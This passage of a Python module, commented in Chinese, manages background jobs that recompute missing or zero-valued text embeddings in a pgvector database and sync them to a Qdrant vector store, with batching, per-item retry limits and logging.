    # 受管后台回填（持有任务引用, 不被 GC 取消）。新开独立 session, 不复用已提交的短命 session。
    launch_embedding_backfill()


# ── 受管 embedding 后台回填 ──
# 修复 v6 (2026-09-02): 原实现用 fire-and-forget `asyncio.create_task(_compute_missing_embeddings(session))`
# ——持有 request-scoped session、任务无引用被 GC 取消, 回填从未真正跑过(Qdrant/pg 实测 0 真实向量)。
# 现改为: 任务引用被模块级 set 保活(完成自动移除), 自建独立 async_session,
# 并支持由 scheduler 周期性触发, 达到"重启/漏跑即自愈"。

_backfill_tasks: set = set()
# 每批最大 embedding 数(避免一次性占用过多 API 并发与内存)
_BACKFILL_BATCH = 200
# 全零向量 epsilon: abs(v) 均 <= eps 视为"占位零向量", 需重算
_ZERO_EPS = 1e-5
# 单次运行内同一 id 连续失败的"退避"上限; 达上限后本运行不再尝试(交由 5min 巡检重新尝试)
_MAX_FAIL_PER_ID = 3


def launch_embedding_backfill(scope: str = "chunks") -> dict:
    """登记一个受管后台回填任务; 若相同 scope 已在跑则跳过。
    返回 {launched: bool, running: bool}。不阻塞调用方。"""
    running = any(getattr(t, "__scope__", None) == scope and not t.done()
                  for t in _backfill_tasks)
    if running:
        return {"launched": False, "running": True}

    task = asyncio.create_task(_backfill_runner(scope=scope))
    setattr(task, "__scope__", scope)
    _backfill_tasks.add(task)
    task.add_done_callback(_backfill_tasks.discard)
    return {"launched": True, "running": True}


async def _backfill_runner(scope: str = "chunks"):
    """独立 session 下做 embedding 回填(含缺失与全零占位)。"""
    from models import Memory, async_session  # noqa: F401 (model 选择用)
    from models import KnowledgeChunk
    from summary_compression import embedder
    from config import settings

    if scope not in ("chunks", "memories"):
        scope = "chunks"
    model = Memory if scope == "memories" else KnowledgeChunk
    target_dim = settings.embedding_dim
    batch = max(1, _BACKFILL_BATCH)
    try:
        async with async_session() as session:
            done_total = 0
            attempts: dict = {}  # id -> 本运行连续失败次数(退避门)
            for _ in range(10000):  # 死循环护栏
                base_ids = await _select_missing_ids(session, model, target_dim, limit=batch * 2)
                # 过滤掉本运行中已达退避上限的顽固 id(交由下一次巡检新运行重试)
                ids = [i for i in base_ids if attempts.get(i, 0) < _MAX_FAIL_PER_ID]
                ids = ids[:batch]
                if not ids:
                    break
                stmt = select(model).where(model.id.in_(ids))
                chunks = (await session.execute(stmt)).scalars().all()
                logger.info(
                    f"[EmbedBackfill] Computing embeddings for {len(chunks)} "
                    f"{scope} (target_dim={target_dim}, batch={batch})..."
                )
                worked = 0
                degraded_now = 0
                for ch in chunks:
                    try:
                        raw = getattr(ch, "content", None) or " "
                        vec = await embedder.embed(str(raw)[:1000])
                        vec = list(vec or [])
                        if not vec or len(vec) < max(target_dim - 8, 8) or max((abs(x) for x in vec), default=1.0) <= _ZERO_EPS:
                            # API 失败或返回零向量(降级产物) → 视为失败, 不存脏数据
                            degraded_now += 1
                            attempts[ch.id] = attempts.get(ch.id, 0) + 1
                            await asyncio.sleep(0.2)  # 节流, 给上游 API 一点喘息
                            continue
                        ch.embedding = vec[:target_dim] if len(vec) > target_dim else vec
                        worked += 1
                        attempts.pop(ch.id, None)  # 成功则清退避计数
                    except Exception as e:
                        logger.warning(f"Embedding failed for chunk {ch.id}: {e}")
                        degraded_now += 1
                        attempts[ch.id] = attempts.get(ch.id, 0) + 1
                if degraded_now:
                    logger.info(f"[EmbedBackfill] batch degraded={degraded_now} ok={worked}")
                await session.commit()
                done_total += len(chunks)
                if worked == 0:
                    # 本批全部失败(API 不可用或全被退避) → 退出, 交由下次调度重试; 已 commit 的保留
                    logger.warning(f"[EmbedBackfill] batch had {worked} ok; aborting to retry later")
                    return
                logger.info(f"[EmbedBackfill] committed batch, cumulative done={done_total}")
                if not ids or len(ids) < batch:
                    break
            if done_total == 0:
                logger.info(f"[EmbedBackfill] no {scope} missing embeddings; skip")
            else:
                logger.info(f"[EmbedBackfill] {scope} done, total backfilled={done_total}")
                if scope == "chunks":
                    await _sync_all_to_qdrant(done_total)
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.warning(f"[EmbedBackfill] {scope} failed (will retry later): {e}")


async def _select_missing_ids(session, model, dim: int, limit: int):
    """返回需要回填(embedding IS NULL 或维度不符或全零)的 id 列表。

    注意: pgvector 无维度列会按实际长度存向量; 历史占位曾以 1536 维写成全零向量
    (pgvector 保存值即该长度), 因此不能依赖 `embedding == [0.0]` 这类 Python 列表
    字面量比较——对长向量永远不会为真, 这正是原 bug #2。改为 SQL 层
    vector_dims() + 全零向量检测, 保证占位也纳入回填。"""
    table = model.__tablename__
    sql = text(f"""
        SELECT id FROM {table}
        WHERE embedding IS NULL
           OR vector_dims(embedding) <> :dim
           OR (SELECT coalesce(bool_and(abs(v) <= :eps), false)
               FROM unnest(cast(embedding as real[])) v) = true
        ORDER BY id
        LIMIT :limit
    """)
    rows = (await session.execute(sql, {"dim": dim, "eps": _ZERO_EPS, "limit": limit})).all()
    return [r[0] for r in rows]


async def _sync_all_to_qdrant(expected: int):
    """尽力把最新 pg 向量(回填完成后)sync 到 Qdrant; 失败静默降级 pgvector。"""
    from config import settings
    from qdrant_store import qdrant_store
    from sqlalchemy import text as _text
    try:
        dim = settings.embedding_dim
        # qdrant store 的批量 upsert 需要运行在访问模型的 session 内; 这里直接用独立连接执行
        from models import async_session as _as
        async with _as() as session:
            sql = _text("""
                SELECT chunk_id, doc_id, embedding, content, title, threat_types,
                       severity, source, tags
                FROM knowledge_chunks
                WHERE embedding IS NOT NULL AND vector_dims(embedding) = :dim
            """)
            rows = (await session.execute(sql, {"dim": dim})).all()
        synced_items = []
        for r in rows:
            vec = [float(x) for x in r[2]]
            synced_items.append({
                "chunk_id": r[0], "doc_id": r[1], "vector": vec,
                "payload": {
                    "content": (r[3] or "")[:1500], "title": r[4] or "",
                    "threat_types": list(r[5] or []), "severity": r[6] or "",
                    "source": r[7] or "", "tags": list(r[8] or []),
                },
            })
        total = 0
        for i in range(0, len(synced_items), 64):
            await qdrant_store.upsert_chunks_batch(synced_items[i:i + 64])
            total += len(synced_items[i:i + 64])
        logger.info(f"[Qdrant] sync {total} knowledge chunks to qdrant (backfilled ~{expected})")
    except Exception as qe:
        logger.warning(f"[Qdrant] 双写失败(降级 pgvector): {qe}")


async def has_missing_embeddings(scope: str = "chunks") -> bool:
    """供 scheduler/启动检查是否仍有缺失(避免反复空跑)。"""
    from config import settings
    from models import KnowledgeChunk, Memory, async_session
    dim = settings.embedding_dim
    async with async_session() as session:
        model = KnowledgeChunk if scope == "chunks" else Memory
        ids = await _select_missing_ids(session, model, dim, limit=1)
        return bool(ids)
